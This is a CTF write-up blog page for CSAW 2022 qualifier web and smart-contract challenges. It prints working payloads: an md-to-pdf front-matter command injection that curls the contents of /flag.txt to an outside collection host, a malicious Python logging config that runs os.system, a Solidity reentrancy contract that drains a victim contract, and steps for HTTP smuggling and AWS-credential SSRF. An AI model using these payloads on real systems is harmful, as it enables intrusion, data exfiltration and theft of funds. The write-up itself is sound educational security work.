<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>pragma solidity </span><span class="token" style="color:#d4d4d4">&gt;=</span><span class="token" style="color:#b5cea8">0.8</span><span class="token" style="color:#b5cea8">.7</span><span class="token" style="color:#d4d4d4">;</span><span>    
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">VictimContract</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">newAccount</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>  external payable</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">donateOnce</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>  external</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> external view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>uint256 donatorBalance</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getFlag</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bytes32 _token</span><span class="token" style="color:#d4d4d4">)</span><span> external </span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>contract </span><span class="token" style="color:#4ec9b0">ExploitDonation</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>    address </span><span class="token" style="color:#569CD6">public</span><span> victimAddress</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>    </span><span class="token" style="color:#4ec9b0">VictimContract</span><span> victimContract</span><span class="token" style="color:#d4d4d4">;</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>    </span><span class="token" style="color:#dcdcaa">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address _victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>            victimAddress</span><span class="token" style="color:#d4d4d4">=</span><span>_victimAddress</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span>            victimContract</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#dcdcaa">VictimContract</span><span class="token" style="color:#d4d4d4">(</span><span>victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">23</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">startAttack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> payable </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">24</span><span>        victimContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">newAccount</span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">value</span><span class="token" style="color:#d4d4d4">:</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">value</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">25</span><span>        victimContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">donateOnce</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">26</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">27</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">28</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">29</span><span>    </span><span class="token" style="color:#dcdcaa">fallback</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>external payable </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">30</span><span>        uint my_balance</span><span class="token" style="color:#d4d4d4">=</span><span> victimContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">getBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">31</span><span>        </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>my_balance</span><span class="token" style="color:#d4d4d4">&lt;=</span><span class="token" style="color:#b5cea8">20</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">32</span><span>            victimContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">donateOnce</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">33</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">34</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">35</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">36</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">37</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> victimContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">getBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">38</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">39</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">40</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getFlag</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bytes32 _token</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">41</span><span>        victimContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">getFlag</span><span class="token" style="color:#d4d4d4">(</span><span>_token</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">42</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">43</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">44</span>
</span></code></div></pre>
<h2 class="chakra-heading css-1uc67dn" id="final words">Final words</h2>
<p class="chakra-text css-0" node="[object Object]">I want to congratulate the organizers for their huge efforts and these great tasks.
Kudos to all my teammates for their perseverance and hard work during the competition. We successfully made it to the finals by achieving the first place in MENA !! Many words but not enough of them, all the efforts put to get such results, but most importantly <span class="chakra-text css-gv9qss">CSAW 2K22 finals here we come</span>.</p>
<h2 class="chakra-heading css-1uc67dn" id="links">Links</h2>
<ul>
<li><a class="chakra-link css-9olwc6" href="https://github.com/yassinebk/ctf-writeups/blob/main/csaw-2k22-qual/README.md">Github Repo</a></li>
<li><a class="chakra-link css-9olwc6" href="https://blog.anas-cherni.me/2022/09/14/csaw2k22/">N0s Writeup</a></li>
<li><a class="chakra-link css-9olwc6" href="https://4n6nk8s.tech/2022/09/12/Writeups/csaw2022/?fbclid=IwAR2lkfD8gD6AggLv-c1P_tFP1PdK607fKFf4Rg5Ozi597A6lHdKlfM80wsw">Raf² &amp; Adam</a></li>
<li><a class="chakra-link css-9olwc6" href="https://l.facebook.com/l.php?u=https%3A%2F%2Fironbyte.me%2Fezmaze%2F%3Ffbclid%3DIwAR1UWnHRheApKCK7MtfcN_6lOBeSLEecT5NLBSETDwITNu-6bNPCnw497uA&amp;h=AT14Q4UItbyzfDyj05vOBfFIIKwME3bO40gyNJOqD3UR4a2bex6wsRTEk26B9c6GQdjVbxako_OZtruE3LkafzkaiL_aXfDFmo0W0RiOwke5hiQxeQMt1sFjz7zYx2nkUAy8Gw">Ironbyte</a></li>
</ul></div></div><style data-emotion="css bgi5lz">.css-bgi5lz{min-height:67px;height:20vh;width:100vw;}</style><div id="footer-placeholder" class="css-bgi5lz"></div></div><style data-emotion="css 1pclkm">.css-1pclkm{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;z-index:var(--chakra-zIndices-banner);width:100vw;position:fixed;bottom:0px;height:6%;min-height:67px;background-color:var(--chakra-colors-darkBackground);color:var(--chakra-colors-lightBackground);}</style><footer id="main-footer" class="css-1pclkm"><style data-emotion="css 10btk8j">.css-10btk8j{font-style:400;font-size:var(--chakra-fontSizes-lg);text-align:center;}@media screen and (min-width: 30em){.css-10btk8j{font-size:var(--chakra-fontSizes-lg);}}@media screen and (min-width: 48em){.css-10btk8j{font-size:var(--chakra-fontSizes-2xl);}}</style><p class="chakra-text css-10btk8j">© Yassine Belkhadem, 2022 · All Copyrights Reserved.</p></footer><span></span></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"slug":"csaw-quals-2k22","meta":{"title":"CSAW 2K22 Quals - Writeups","date":"2022-09-11","cover-image-large":"https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663609975/large_csaw_blog_main_98bebe18a4.jpg","cover-image-small":"https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663609977/small_csaw_blog_main_98bebe18a4.jpg","tags":["Cybersecurtiy","Writeups","Event","CTF","S0ter14"],"createdAt":null},"content":"# CSAW 2K22 Quals\n\nMy team Soter1a and I have participated in CSAW 2k22 Quals. Hope you enjoy my writeup for all Web tasks and one misc one ^^. \n\n## World wide web\n\n![World wide web](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608175/csaw/world-wide-web_xlvzqa.png)\n![world wide web root](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/world-wide-web-firstly_dvcthr.png)  \n\n![world wide web /stuff](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608174/csaw/world-wide-web-secondly_iahju2.png)  \n\nI tried to find if there is any other **\u003ca\u003e** tags in the page.\n\n![world wide web terminal curl](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608171/csaw/world-wide-web-third_qwc7dw.png)\n\nUsing browser devtool and CTRL+F I did 3 times each time I look for the **\u003ca\u003e** and click on it. Also I noticed that I got a very interesting cookie set.\n\n![world wide web cookie](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608168/csaw/world-wide-web-cookie_sxiiau.png)\n\n**solChain** well what got my attention is the chain part. If the server is actually tracking the sequence of path I have visited then there must be something. Also, I tried to repeat the process twice and I found out the sequence of words is the same.\n\nCrafting my final script....\n\n```py\nimport requests\n\nurl=\"http://web.chal.csaw.io:5010/\"\n\n\nsession = requests.Session()\n\n\nwith session : \n    next_word='stuff'\n    while True:\n        response1= session.get(url+next_word)\n        print(session.cookies)\n        try:\n            startingIndex=response1.text.index('href=\"/')\n            endText=response1.text[startingIndex:].index('\"\u003e')\n        except :\n            print(response1.text)\n            break\n        print(\"next word:\",response1.text[7+startingIndex:endText+startingIndex])\n        next_word=response1.text[7+startingIndex:endText+startingIndex]\n```\n\n![world-wide-web-flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/world-wide-web-flag_dtwoou.png)  \n\n## My Little website\n\n![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608180/csaw/my-little-website_yp34fj.png)\n\n![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/my-little-website-challenge-pic_xuyuqc.png)\n\nSo as far my enumeration went that's what I found:\n\n- **expressJS** server running, identified with the headers.\n- Opens a headless chrome instance to render the pdf.\n- Dynamic XSS didn't work, might be beacuse the bot doesn't wait for the JS execution and even forcing it to wait doesn't really work it renders the HTML,CSS and then the PDF.\n\nA wild guess by my teammate **M0ngi** about the markdown parser, the CVE was *CVE-2021-23639* which occurs in the vulnerable version of *md-to-pdf*.\n\nSo we execute our final payload.\n\n```md\n---js\n((require(\"child_process\")).execSync(\"curl https://en7nqjdbzyckx.x.pipedream.net/ -d \\\"$(cat /flag.txt)\\\" \"))\n---\n```\n\n![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/my-little-website-flag_sqrb1m.png)\n\n## Good Intentions\n\n![Good intentions](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608207/csaw/good-intentions_q5rbw9.png)\n\nReading through the code, I found that the upload is secure.\n![Secure upload](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608180/csaw/secure-upload_cs0nrd.png)\n\nBut going further down the code the function to set the **logger** configuration file is vulnerable to **path traversal**.\n\n![Unsecure Log set](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608175/csaw/unsecure_logconf_gan7js.png)\n\nHere, I didn't know which evil configuration should I **upload** then set the logger to. I needed to have RCE on the server. Fortunately enough, my teammate **n0s** sent me this link  of an [Evil logger](https%3A%2F%2Fgithub.com%2Fraj3shp%2Fpython-logging.config-exploit%2Fblob%2Fmain%2Fexploit%2Fbad-logger.conf%3Ffbclid%3DIwAR0W2Cdm3GLHqtFbAQjU3iatoSSTnlbj-kuUP_FYX3jYVHTvDvH7LrneBW4\u0026h=AT2QW5JZ9Xo6Qxu0-PtnFRXvizekY-KwhalZdV6aiTe0nGrJKkLDiGvLKFysZp_1QIS5xBW03o98eLDuK-LJYfHx4uSZwRB05MOYG7pu420p1iUPViifuWgRXOQHSLMjihPiJQ).\n\nSo the final chain will be as the following:\n\n![good-intentions-request-chain](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608204/csaw/good-intentions-request-chain_wf7er2.png)\n\n### Logger code **payload.conf**\n\n```yaml\n[loggers]\nkeys=root,simpleExample\n\n[handlers]\nkeys=consoleHandler\n\n[formatters]\nkeys=simpleFormatter\n\n[logger_root]\nlevel=DEBUG\nhandlers=consoleHandler\n\n[logger_simpleExample]\nlevel=DEBUG\nhandlers=consoleHandler\nqualname=simpleExample\npropagate=0\n\n[handler_consoleHandler]\nclass=__import__('os').system('cat /flag.txt \u003e /app/application/static/images/de5fb214024af96b9f49ace64886c5/payload_ca36a4c20fafe498f263')\nlevel=DEBUG\nformatter=simpleFormatter\nargs=(sys.stdout,)\n\n[formatter_simpleFormatter]\nformat=%(asctime)s - %(name)s - %(levelname)s - %(message)s\n```\n\nI fired up my postman to execute that and here comes the flag !\n![Flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608207/csaw/Flag_zjj7z6.png)\n\n## Smuggling Mail\n\n![Smuggling mail](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail_kotgch.png)  \n\nGoing through the code, these are my findings:\n\n- We got a **varnich** cache server.\n\n![Smuggling-mail-varnish-conf](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/smuggling-mail-varnish-config_vlwtw8.png)  \n\n- A **hitch** TLS proxy accepting HTTP/2 requests.\n![smuggling-mail-hitch-conf](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608177/csaw/smuggling-mail-hitch-conf_t1dsbh.png)\n\nA quick research on the **varnish** cache server and I found the **CVE-2021-36740**. Actually, the cache server which works as the \"frontend\" here passes the HTTP/2 to the backend which downgrades the request to HTTP/1 which will be handled as two requests. Yes, that's a H2.CL vulnerability also there is a cve that made me try to HTTP Smuggling exploit.\n\n![smuggling-mail cve](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608178/csaw/smuggling-mail-cve_s6xc02.png)\n\nThat's perfectly our case, we want to bypass the authentication condition in the **varnish** config.\n![smuggling-mail to bypass](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-to-bypass_mlxaam.png)\n\nWe can use the **/waitlist** endpoint for the original request but what do we want to do here ?\n![smuggling-mail RCE code](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-rce-code_lze7hw.png)  \n\nSo we want to reach the **/admin/alert** to trigger an RCE but how can we do it ? Some research and with the help of my teammate 'm0ngi' We found the last missing piece [Mailutils cve](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail-mail-cve_vwprts.png)\n\n\u003e We can **~ OUR_COMMAND**\n\n### Putting it all together\n\n![smuggling mail request](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-trigger-request_zcuwoo.png)\n![Smuggling mail rce ](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail-rev-shell_nubljz.png)\n\n## Lost in Amazon\n\n![Lost in amazon](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608198/csaw/losti-in-amazon_topqca.png)  \n\n\u003e This challenge was a little bit too blind. What caused confusion is the directory busting part. It's not a natural thing to come to your mind while solving a CTF task.\n\nI was really confused and couldn't find a thing till I got a discord notification.\n\n![Lost in Amazon Discord](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608187/csaw/lost-in-amazon-discord_vbgepl.png)  \n\nWell, a quick directory busting with **wfuzz**, I found two endpoints.\n![Lost in amazon Wfuzz output 1 ](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-wfuzz-1_qjhpzv.png)  \n\nI curled both paths, **/secret** gave me a JWT and **rockyou** a page that has nothing in it. \n![Lost in amazzon Confusion](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608198/csaw/lost-in-amazon-token-lost_rninuu.png)  \n\nAn intuitive move is to set the jwt token and revisit **/rockyou** right ? It gave me nothing. I tried to set **secret** cookie as the JWT too but nothing ...  also we should note that jwt itself has nothing interesting. I felt really like I hit a dead end.\n![picture 18](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608185/csaw/lost-in-amazon-jwt-check_igswk3.png)  \n\nAt last, I reached for the admin, I knew that there was something unintuitive to do **also noting the cries of agony in the discord channel because of the task**\n![Lost in amazon HINT](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-hint_c7cdii.png)  \n\nOh I see I had to fuzz one path deeper and found **/developer/heaven**\n![Lost in amazon dirbusting depths 2](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608205/csaw/lost-in-amazon-dirb_bjnbne.png)  \n![Lost in amazon /developer/heaven](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608219/csaw/lost-in-amazon-findings2_sfiezz.png)  \n\nNow I have an idea why do I need the JWT token. I added a cookie with the name of **secret**.\n![Lost in amazon access /developer/heaven](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608215/csaw/lost-in-amazon-access_zf2ld5.png)  \n\nIt was really easy now. Going back to the name of the Task and especially the **amazon** part. I knew it was an amazon SSRF vulnerability.\nI didn't waste any time.\n\n\u003e I tried tempering with the _magiccall paramater but it gave nothing so I passed.\n\n![Lost in amazon aws creds](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608194/csaw/lost-in-amazon-creds_df6cet.png)  \n\nI added the profile to my **aws-cli**.\n![Lost in amazon aws configure](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608193/csaw/lost-in-amazon-aws-config_nzybus.png)  \n\nThen I tried to look for any **s3 buckets**\n![Lost in amazon s3 error](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-s3_ie3fcj.png)  \n\nMy teammate **N0s** pinged me here and told me to try to specify the bucket region as buckets can be region-specific. So I looked for it\n![Lost in amazon finding region](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608186/csaw/lost-in-amazon-region_tcoilm.png)  \n\nand finally I got the flag.\n![Lost in amazon flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608189/csaw/lost-in-amazon-flag-aws_qr4uzq.png)\n\n## DonateMe\n\n![Donate more](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608208/csaw/donate-more_efrhig.png)  \n\nA basic **reentrancy vulnerability**. I crafted an evil contract to exploit it.\n\n1. Send 0.0001 ether to trigger the reentrancy loop.\n2. Stop the loop after the balance gets to 30.\n3. Send the token via **getFlag**\n   \u003e You can use ethers.utils.formatBytes32String(TOKEN) to get the right format to pass.\n4. **yes** and get the flag.\n\n```js\n// SPDX-License-Identifier: MIT\n\npragma solidity \u003e=0.8.7;    \n\ninterface VictimContract { \n    function newAccount()  external payable;\n\n    function donateOnce()  external;\n\n    function getBalance() external view returns (uint256 donatorBalance) ;\n    function getFlag(bytes32 _token) external ;\n}\n\ncontract ExploitDonation { \n    address public victimAddress;\n    VictimContract victimContract; \n\n    constructor(address _victimAddress){\n            victimAddress=_victimAddress;\n            victimContract=VictimContract(victimAddress);\n    }\n\n    function startAttack() public payable {\n        victimContract.newAccount{value:msg.value}();\n        victimContract.donateOnce();\n\n    }\n\n    fallback()external payable {\n        uint my_balance= victimContract.getBalance();\n        if (my_balance\u003c=20)\n            victimContract.donateOnce();\n\n    }\n\n function getBalance() public view returns (uint256) {\n        return victimContract.getBalance();\n    }\n\n    function getFlag(bytes32 _token) public {\n        victimContract.getFlag(_token);\n    }\n}\n```\n\n## Final words\n\nI want to congratulate the organizers for their huge efforts and these great tasks.\nKudos to all my teammates for their perseverance and hard work during the competition. We successfully made it to the finals by achieving the first place in MENA !! Many words but not enough of them, all the efforts put to get such results, but most importantly **CSAW 2K22 finals here we come**.\n\n\n## Links\n- [Github Repo](https://github.com/yassinebk/ctf-writeups/blob/main/csaw-2k22-qual/README.md)\n- [N0s Writeup](https://blog.anas-cherni.me/2022/09/14/csaw2k22/)\n- [Raf² \u0026 